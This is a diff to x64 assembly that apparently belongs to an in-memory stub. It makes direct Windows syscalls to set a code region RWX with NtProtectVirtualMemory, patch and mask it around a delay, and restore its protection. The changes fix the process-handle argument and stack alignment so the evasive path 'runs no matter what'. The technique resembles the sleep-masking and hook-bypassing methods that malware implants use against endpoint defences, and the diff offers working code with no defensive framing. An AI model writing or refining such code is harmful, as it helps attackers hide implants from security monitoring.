@@ -116,7 +116,8 @@ sym_base:
     mov [r12 + (data_nr_protect - sym_base)], rax
 
     ; ---- 5. NtProtectVirtualMemory(RWX) over the target ------------------
-    ;   NtProtectVirtualMemory(NULL, &prot_base, &prot_size, 0x40, &saved_old_prot)
+    ;   NtProtectVirtualMemory(-1, &prot_base, &prot_size, 0x40, &saved_old_prot)
+    ;   (-1 = the current-process pseudo-handle; 0/NULL => STATUS_INVALID_HANDLE)
     ;   Windows x64 syscall ABI (direct `syscall`, not a `call`):
     ;     arg0 = RCX mirrored into R10, arg1 = RDX, arg2 = R8, arg3 = R9,
     ;     arg4 = [RSP+0x28]; RSP must be ≡ 8 (mod 16) at the `syscall`,
@@ -136,7 +137,7 @@ sym_base:
     lea rdx, [r12 + (prot_base - sym_base)]   ; arg1 = BaseAddress*
     lea r8,  [r12 + (prot_size - sym_base)]   ; arg2 = RegionSize*
     mov r9d, 0x40                    ; arg3 = PAGE_EXECUTE_READWRITE
-    xor rcx, rcx                     ; arg0 = NULL (current process)
+    mov rcx, -1                      ; arg0 = -1 (current process; 0 => INVALID_HANDLE)
     mov r10, rcx                     ; arg0 -> R10 (the kernel reads arg0 from R10)
     mov eax, [r12 + (data_nr_protect - sym_base)]
     syscall
@@ -145,12 +146,25 @@ sym_base:
     test eax, eax                    ; NTSTATUS: bit31 set = error/fatal
     jns .s6_patch                    ; success/warning -> go patch + mask
     ; NtProtect failed: the text isn't RWX, so we can't safely patch it in
-    ; place. Fall back to a real (unmasked) NtDelayExecution so the wait still
-    ; happens -- "runs no matter what."
-    lea rdx, [r12 + (timeout_val - sym_base)]   ; arg1 = &Duration (250 ms, 100ns)
-    xor rcx, rcx                     ; arg0 = InState (0 = relative)
-    mov rax, [r12 + (saved_ntdelay - sym_base)]
-    call rax
+    ; place. Fall back to a real (unmasked) NtDelayExecution via a DIRECT
+    ; syscall (consistent with steps 5/8; no `call` RSP-alignment to get
+    ; wrong) so the wait still happens -- "runs no matter what."
+    ;   NtDelayExecution(Alertable=0, &Duration); Duration = -2,500,000
+    ;   (negative = RELATIVE, 250 ms, 100-ns units). The mask stub never
+    ;   runs on this path, so overwrite timeout_val in place with the value
+    ;   NtDelayExecution wants to read.
+    mov rax, [r12 + (timeout_val - sym_base)]
+    neg rax                                   ; +2500000 -> -2500000 (relative)
+    mov [r12 + (timeout_val - sym_base)], rax
+    mov r13, rsp                     ; r13 = S0 (restore point)
+    and rsp, -16                     ; entry-independent 16-align (any caller frame)
+    sub rsp, 8                       ; direct-syscall ABI: RSP ≡ 8 (mod 16)
+    lea rdx, [r12 + (timeout_val - sym_base)]   ; arg1 = &Duration
+    xor rcx, rcx                     ; arg0 = Alertable (0 = non-alertable)
+    mov r10, rcx                     ; arg0 -> R10 (the kernel reads arg0 from R10)
+    mov eax, [r12 + (data_nr_delay - sym_base)]  ; syscall nr
+    syscall
+    mov rsp, r13                     ; restore RSP = S0
     mov dword [r12 + (delay_status - sym_base)], eax
     mov qword [r12 + (done_flag - sym_base)], 1
     jmp .exit
@@ -186,7 +200,7 @@ sym_base:
     lea rdx, [r12 + (prot_base - sym_base)]   ; arg1 = BaseAddress* (pointer, like step 5)
     lea r8,  [r12 + (prot_size - sym_base)]   ; arg2 = RegionSize*
     mov r9d, [r12 + (saved_old_prot - sym_base)]  ; arg3 = restore ORIGINAL prot
-    xor rcx, rcx                     ; arg0 = NULL
+    mov rcx, -1                      ; arg0 = -1 (current process; 0 => INVALID_HANDLE)
     mov r10, rcx                     ; arg0 -> R10
     mov eax, [r12 + (data_nr_protect - sym_base)]
     syscall
